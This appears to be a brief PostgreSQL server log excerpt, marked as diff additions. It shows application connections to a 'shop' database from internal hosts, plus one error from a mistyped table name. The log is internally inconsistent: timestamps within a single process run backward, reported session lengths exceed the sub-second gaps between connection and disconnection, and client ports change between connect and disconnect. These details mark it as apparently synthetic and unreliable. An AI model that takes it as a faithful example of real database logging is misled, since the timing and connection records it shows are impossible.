+2026-10-15 08:53:13.776 UTC [4203] LOG:  disconnection: session time: 0:00:03.391 user=app database=shop host=10.0.0.31 port=54368
+2026-10-15 08:53:44.800 UTC [4204] LOG:  connection received: host=10.0.0.31 port=54393
+2026-10-15 08:53:44.437 UTC [4204] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:53:44.724 UTC [4204] LOG:  disconnection: session time: 0:00:04.867 user=app database=shop host=10.0.0.31 port=64370
+2026-10-15 08:54:15.906 UTC [4205] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:54:15.377 UTC [4205] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:54:46.229 UTC [4206] LOG:  connection received: host=10.0.0.25 port=58795
+2026-10-15 08:54:46.278 UTC [4206] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:54:46.356 UTC [4206] LOG:  disconnection: session time: 0:00:09.109 user=app database=shop host=10.0.0.25 port=45854
+2026-10-15 08:55:17.755 UTC [4207] LOG:  connection received: host=10.0.0.34 port=63342
+2026-10-15 08:55:17.404 UTC [4207] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:55:17.363 UTC [4207] LOG:  disconnection: session time: 0:00:06.345 user=app database=shop host=10.0.0.34 port=62981
+2026-10-15 08:55:48.771 UTC [4208] LOG:  connection received: host=10.0.0.27 port=51252
+2026-10-15 08:55:48.223 UTC [4208] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:55:48.750 UTC [4208] LOG:  disconnection: session time: 0:00:07.747 user=app database=shop host=10.0.0.27 port=58531
+2026-10-15 08:56:19.258 UTC [4209] LOG:  connection received: host=10.0.0.31 port=59398
+2026-10-15 08:56:19.376 UTC [4209] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:56:19.884 UTC [4209] LOG:  disconnection: session time: 0:00:05.410 user=app database=shop host=10.0.0.31 port=50031
